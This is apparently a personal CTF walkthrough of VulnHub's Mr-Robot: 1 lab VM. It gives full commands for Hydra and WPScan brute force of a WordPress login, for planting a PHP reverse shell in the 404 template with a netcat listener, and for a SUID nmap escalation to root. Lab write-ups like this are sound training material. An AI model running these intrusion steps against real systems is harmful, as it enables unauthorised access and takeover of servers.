Hello world! Today I'll be detailing the steps I took to hack VulnHub's [Mr-Robot: 1](https://www.vulnhub.com/entry/mr-robot-1,151/) VM, created by Leon Johnson. The VM has three keys hidden in different locations and my goal is to find all three.

## Configuration

I'll be using a [Kali Linux](https://www.kali.org/) VM to attack Mr-Robot: 1, which we will refer to as "target" throughout the write-up. Both machines are set up on [Oracle VM VirtualBox](https://www.virtualbox.org) and their networks are set to the `Host Only Network`.

Let's start hacking!

---

## Where is Key 1? <a name="key_1"></a>

First we will need to do a little reconnaissance, so let's start with figuring out our target's IP address.

To do that, we'll check my Kali machine's address using the command `ip address`.
![IP address command](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/icsxept78c8wiq7kfsh9.png)

With our IP, `192.168.56.104` perform a network scan and check the full range of IP's for our target address with the following command:

`nmap -oX nmap_scan.xml 192.168.56.0/24`

![nmap scan](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/nuenkk7cai1r9x0tcwvi.png)

After a quick check of each IP on the [nmap](https://www.kali.org/tools/nmap/) report, we see our target is on `192.168.56.103`:
![Mr-Robot site](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/nnstd1llm7rpop6kjo2o.gif)

### Enumeration <a name="enum_1"></a>

There are tools like [dirb](https://www.kali.org/tools/dirb/) that we can use to recon any potential subdirectories of the main host address, but this method was exhaustive and can take some time. To be efficient with our time, let's manually check some common subdirectories and see if we can get a lead:

Possible there might be instructions on `192.168.56.103/readme`...
![readme dir](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ox6i5z6j3wqz4uitgqw6.png)

...rude that it's not willing to help us with the hack.

How about `192.168.56.103/license`...
![license dir](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/irvt1z1itziutq41lci8.png)

...ummm, language.

Could see if it's a WordPress (WP) site with `192.168.56.103/wp-login`...
![WordPress login dir](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5u4ln5mcrksz5nqv52j0.png) <a name="earlier"></a>

...looks like we got ourselves a WP site. Let's try the default `admin` & `password` attack, see if we can get in.
![Default login attack](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/dvlgjva8va32olp9vzgk.png)<a name="error-mes"></a>
![Login error](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6jimlkzgwpt9thxlvilx.png)

...hmmm, doesn't look like we can get in. Noting the error message, it's prompted because of invalid username. So if we enter the correct username, would it prompt us with “Invalid password” instead? 👀

We'll circle back to the WP login later...

What about `192.168.56.103/robot.txt`, which is a file used for site indexing...
![robots.txt](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/bl0ogx2ig5upmqwa24id.png)

...and luckily enough, there's `key-1-of-3.txt`, our 1st key! ✅

![key-1-of-3](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/bjq6q28xwqwtnfrxsfw5.png)

---

## Where is Key 2? <a name="key_2"></a>

As we saw [earlier](#earlier), there is a WP site we can try logging into, but of course, can't login without the right username & password.

Using WPScan, we can try to find any valid users:

`wpscan --url http://192.168.56.103/wp-login.php —enumerate u`
![WPScan enumeration](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ywmiebwma3cqxwm6q2wm.png)

...but from the looks of it, nothing substantial, except maybe the WordPress version, which seems exploitable.

There was that `fsocity.dic` file we found earlier, maybe there's a lead there? A quick `cat` it seems to be a long list of "random" words...
![fsocity.dic](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/brbgynxarc13xkf7v5ff.png)

...that we can use for possible username and password combinations!

### Brute forcing username & password <a name="brute_force"></a>

There are a few tools that we can use to brute force the WP login:
- [Burp Suite](https://www.kali.org/tools/burpsuite/)
- [Hydra](https://www.kali.org/tools/hydra/)
- [WPScan](https://www.kali.org/tools/wpscan/)

Now remember that word list `fsocity.dic`? Yeah, that one file has `858,160` words...
![word count](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/phtrurt4lj5dyg4efrt2.png)

...and if we use `fsocity.dic` as a wordlist for the cracking tool parameters, it's going to take a long while to brute force `858,160` potential username/password combos.

If we remove any duplicates and sort the wordlist, we could optimize the time it would take to brute force (TL;DR: shorter list, faster time to crack):

`type fsocity.dic | sort | uniq > sorted_uniq_fsocity.txt`

With that one command, we were able to reduce the word count to `11,452`. Now to get crackin'!
![word count compare](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xwdvt43ktm5kgtzoru65.png)


#### Burp Suite

Using Burp Suite, we can configure the attack to use `fsocity.dic` as the word list parameter to brute force the username.
![Burp Suite](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1i3eepehoeytugm8j36k.png)

Looking at the length of each response, most are pretty consistent when erroring out, but scrolling not too far down to Elliot, we see the response is `4164` instead of the usual `4114`. In the Rendered response, we see that the error message shows that the password entered for `Elliot` is incorrect, which from our [previous observation](#error-mes) about error messages us to conclude that `Elliot` is a valid user.

If we used the sorted list, it ideally would've shortened the brute force time execution. However, because it’s also sorted it could take longer to see the target response, especially if the right credential is last on the word list.

Considering how long it might take to use Burp Suite to brute force the password (since this is a Community version of Burp), we’ll move on with another tool, Hyrda.

#### Hydra

Using Hydra, we're able to brute force a valid login, when using the original `fsocity.dic` and an arbitrary password `test`:

```shell
hydra -V -L ./fsocity.dic -p test 192.168.56.103 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.103%2Fwp-admin%2F&testcookie=1:Invalid username"
```
![hydra username brute force](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/16y4hlrfb1cwriy9j6pb.png)

 Again, it was fairly quick since the username `Elliot` was right near the top. But if we were to used the sorted, unique version of fsocity.dic, it would've taken up to attempt `5,488` of `11,452` in order to get the username:
![hydra username results](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fjb552pdajewzlxo0u6j.png)

After username, now we can brute force the password with username `elliot`, and here we'll use our duplicate-removed and sorted version of our wordlist `sorted_uniq_fsocity.dic`:

```shell
hydra -V -l elliot -P ./sorted_uniq_fsocity.dic 192.168.56.103 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.103%2Fwp-admin%2F&testcookie=1:incorrect"
```
![hydra password brute force](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/eeyq6qbzt8tmevlnd52n.png)

#### WPScan

Note, with WPScan, since we were unable to enumerate any valid users with our preliminary scan, we'll have to rely on the previously mentioned tools (Burp & Hydra) to find the username first.

Once found, we can then use WPScan as an alternative to brute force the password like so:

```shell
wpscan -t 10000 -U Elliot -P fsocity.dic --url http://192.168.56.103/
```
![wpscan password brute force](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/klzlzl4h0axssrw3xklw.png)

So of the three tools, Hydra was most ideal with its quick execution time with this particular machine config. If circumstances were different, maybe users were enumerated or we were using the full Burp Suite version, the other tools would've been better for the job.
```shell
username: Elliot
password: ER28-0652
```
Now that we have our valid credentials, let's login to the WP site!
![WordPress dashboard](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/d5u0qof60ur1eon8d5hv.png)

### Running reverse shell on target

Our next moves are going to see if we can run reverse shell from [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) by inserting it into the `404.php` file of the WP site.

Will need to switch network back to `Bridge Adapter` in order to download the reverse shell, and then switch back to `Host Only Adapter` to reconnect with the target.

To download the reverse shell onto Kali machine:
```shell
wget "http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz"
```

Extract it, then go into php-reverse-shell.php file using `vim` and replace the `$ip` value with your attacking machine IP: `192.168.56.104`. And change the port to a “cool” number: `4242`
![Reverse shell config](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hoikljnww6ukanydqsag.png)

Copy the `php-reverse-shell.php` code and paste it into `Appearance > Editor > 404 Template` and update the file.
![Paste reverse shell on 404.php](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mu4r2l28ijtah1l9vnfn.png)

Using [NetCat](https://www.kali.org/tools/netcat/), we set up a listener on port `4242` with command: `nc -lnvp 4242`
![netcat](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qfnamrfo8udkrwee4f8c.png)

Open new terminal:
```shell
curl -X POST http://192.168.56.103/404.php
# This will send a POST request to the 404.php page
```
Can also send a POST request on web browser → `http://102.168.56.103/flaskdjhflakjsdhf`. This will trigger a 404 page, and therefore request will trigger the reverse shell.

Bam, we have our reverse shell!
![reverse shell operational](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/czxp4gdkm2ntz10op43t.png)

Now we want to have interactive control over the target, so let's run `bin/bash`
```shell
python -c "import pty; pty.spawn('/bin/bash')"
```

### Enumeration

Now that we have our "shell in a shell", let's see what we can literally "find" the 2nd key, assuming it is in the same format as the 1st one:
```shell
find / -name "key-2-of-3.txt"
```
Look like we got a hit on the key: `/home/robot/key-2-of-3.txt`
![find command](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vhtha5w7uezhtkh1agvg.png)

We navigate to our target directory `/home/robot`. Once there, we do an `ls -l` and confirm the 2nd key. Then we try to `cat` it to double check, but looks like our current privileges don’t allow us to access said file.
![robot directory nav](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/maoaegsmcnelyrbd0ad7.png)

Looks like it can only be accessed by the `robot` user, but we don’t have a password. We do have a `password.raw-md5` file that appears to be accessible to our current access level.
![cat password file](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/13cjt0cs579mh5po6opd.png)

If we `cat` it, it looks like an [md5](https://en.wikipedia.org/wiki/MD5) hash, which was *obviously* not hinted at by the file name `raw-md5` 👀.

So let’s see if we can decrypt it by sending it to our good friend the [CrackStation](https://crackstation.net/).
![CrackStation](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6gdrel2nvaf3296wjusj.png)

Considering the context clues of the `password.raw-md5` file and its contents, we've just found the password to the robot user.

Note, that if we weren't already running a PTY terminal, we'll need to run `python -c "import pty; pty.spawn('/bin/bash')"` in order to execute the `su robot` commmand:
![su robot](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8kt3herv9fvrzdzyg1hc.png)

So after a quick `su robot` and authorization with our decrypted credentials, we are able to `cat` the `key-2-of-3.txt` file and obtain the 2nd key! ✅
![key-2-of-3](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/777mwziha4ymoiffufvq.png)

---

## Where is Key 3? <a name="key_3"></a>
Thinking of next steps, logically it would make sense to escalate permissions either up or across to other users who have access to files that we don't have access to (aka escalated to `robot` when we were `daemon@linux` in the shell). We'll need to find any files with the [SUID](https://en.wikipedia.org/wiki/Setuid) permission set that we can exploit.

We can run the following to do just that:
```shell
find / -perm /4000 -type f 2>/tmp/2
```
![find SUID perm files](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/e2ecnel5qdsq7iq4c1wa.png)
Hmmm, looking at the files with SUID set...`passwd` seems like a potential lead…

![namp SUID](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/uk7al0ioww1pu82kt5yi.png)
Interesting, why would WP have an `nmap` directory? 👀

### Exploit/escalate permissions to root

On [GTFOBins](https://gtfobins.github.io/) it looks like `nmap` is a Unix binary we can exploit to escalate our privileges. As detailed on the repo, we'll need to run the following commands to spawn an interactive system shell:
```shell
nmap --interactive
!sh
```
![nmap interactive](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9dkd45r5d32mqldavyng.png)
![sh](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pcobxhrxxhuslyytdypy.png)

Run `whoami` to confirm root privileges.
![whoami root](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/uvboinkigfvkle8twj1f.png)

Navigate to `/root`, do a quick `ls` and there is `key-3-of-3.txt`, our final key! ✅
![key-3-of-3](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/n56nszn38fxrc0kjgdxd.png)

---

## Conclusion <a name="conclusion"></a>

Overall, this was a fun challenge for my first exercise in cybersecurity. I was focused on exploring different approaches to find each key, so I can be more aware of my toolkit and future methodology. It was definitely not quick to finish the CTF, but I learned a lot in doing so.

Until the next time, happy hacking! ✌🏻